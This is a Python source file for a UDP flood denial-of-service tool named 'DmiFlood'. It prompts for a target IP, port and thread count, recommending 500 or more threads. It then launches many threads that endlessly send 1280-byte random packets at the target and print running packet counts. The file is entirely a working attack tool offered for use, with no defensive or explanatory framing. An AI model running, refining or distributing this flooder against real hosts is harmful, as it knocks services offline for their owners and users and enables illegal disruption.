import socket
import random
import threading
import os
from colorama import Fore, init

init(autoreset=True)

# Generate random bytes for the attack (1.25 KB per packet)
data = random._urandom(1280)

def banner():
    print(f"""
{Fore.RED}  _  _   _   ___  ___   ___ ___  ___  ___ 
{Fore.RED} | || | /_\ | _ \|   \ / __/ _ \| _ \| __|
{Fore.RED} | __ |/ _ \|   /| |) | (_| (_) |   /| _| 
{Fore.RED} |_||_/_/ \_\_|_\|___/ \___\___/|_|_\|___|
{Fore.WHITE}      >> DmiFlood: SOCKET MODE v3.0 <<
    """)

def socket_attack(ip, port, counter):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Mode
    while True:
        try:
            s.sendto(data, (ip, port))
            counter[0] += 1
            if counter[0] % 500 == 0:
                print(f"{Fore.GREEN}[+] Packets Sent: {counter[0]}")
        except:
            s.close()
            break

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    
    # For this attack, we need IP, not URL
    target_ip = input(f"{Fore.CYAN}Enter Target IP: ")
    target_port = int(input(f"{Fore.CYAN}Enter Port (usually 80 or 443): "))
    threads = int(input(f"{Fore.CYAN}Enter Threads (Recommended 500+): "))
    
    counter = [0]
    print(f"{Fore.YELLOW}[*] Launching Socket Attack on {target_ip}:{target_port}...")

    for i in range(threads):
        t = threading.Thread(target=socket_attack, args=(target_ip, target_port, counter))
        t.daemon = True
        t.start()

    while True:
        try:
            pass
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack Stopped.")
            break

if __name__ == "__main__":
    main()